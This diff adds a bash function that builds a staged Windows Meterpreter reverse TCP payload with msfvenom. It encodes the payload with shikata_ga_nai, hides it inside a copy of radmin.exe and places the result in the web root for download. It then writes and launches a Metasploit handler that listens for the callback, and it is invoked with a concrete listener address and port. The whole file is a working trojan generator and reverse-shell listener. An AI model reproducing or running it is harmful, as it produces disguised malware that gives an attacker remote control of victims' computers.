@@ -1,0 +1,62 @@
+winmetrev_tcp_stager() {
+  # Makes a Staged Windows Meterpreter Reverse TCP Payload
+  # enables UUID Tracking (whitelisting) for payloads, ignores the rest
+  lhost=$1
+  lport=$2
+  setpayvars() {
+    d_payload="-p windows/meterpreter/reverse_tcp"
+    d_lhost="set lhost=$lhost"
+    d_lport="set lport=$lport"
+    d_encode="-e x86/shikata_ga_nai -i 10"
+    d_nop="-n 100"
+    d_format="-f exe -k"
+    d_small="--smallest"
+    d_ignore="IgnoreUnknownPayloads=true"
+    d_uuid="PayloadUUIDName=WinMetRevTCPStager"
+    d_track="PayloadUUIDTracking=true"
+    d_work="WORKSPACE "
+    d_binary="-x /usr/share/windows-binaries/radmin.exe"
+  }
+  setpayvars
+  paygen() {
+    paydirt=`echo \
+      $d_payload \
+      $d_lhost \
+      $d_lport \
+      $d_encode \
+      $d_nop \
+      $d_format \
+      $d_small \
+      $d_ignore \
+      $d_uuid \
+      $d_track \
+      $d_binary`
+    msfvenom $paydirt > /var/www/html/winmetrev_tcp_stager.exe
+  }
+  paygen
+  sethandlervars() {
+    d_use="use exploit/multi/handler"
+    d_payload="set payload `echo $d_payload | cut -d ' ' -f2`"
+    d_dishandler="set DisablePayloadHandler true"
+    d_lhost="set lhost 0.0.0.0"
+    d_lport="set lport $lport"
+    d_ignore="set IgnoreUnknownPayloads true"
+    d_uuid="set PayloadUUIDName WinMetRevTCPStager"
+    d_track="set PayloadUUIDTracking true"
+    d_work="WORKSPACE "
+  }
+  sethandlervars
+  rcgen() {
+    echo $d_use > $msfs/inline_winmetrev_tcp_inline_handler.rc
+    echo $d_payload >> $msfs/inline_winmetrev_tcp_inline_handler.rc
+    echo $d_lport >> $msfs/inline_winmetrev_tcp_inline_handler.rc
+    echo $d_lhost >> $msfs/inline_winmetrev_tcp_inline_handler.rc
+    echo $d_ignore >> $msfs/inline_winmetrev_tcp_inline_handler.rc
+    echo $d_uuid >> $msfs/inline_winmetrev_tcp_inline_handler.rc
+    echo $d_track >> $msfs/inline_winmetrev_tcp_inline_handler.rc
+    echo exploit -j -z >> $msfs/inline_winmetrev_tcp_inline_handler.rc
+  }
+  rcgen
+  (makeXtermLog "Meterpreter_Handler_WinMetRev_TCP_Inline" "$msfc -r $msfs/inline_winmetrev_tcp_inline_handler.rc") &
+}
+winmetrev_tcp_stager 192.168.100.118 4443
